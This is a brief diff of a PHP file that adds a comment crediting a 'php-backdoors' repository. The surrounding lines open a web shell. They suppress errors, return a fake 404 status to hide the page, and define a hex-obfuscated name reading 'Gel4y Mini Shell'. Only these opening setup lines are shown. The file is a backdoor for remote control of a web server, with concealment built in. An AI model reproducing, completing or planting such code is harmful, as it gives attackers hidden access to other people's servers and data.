@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 error_reporting(0);
 http_response_code(404);
 define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
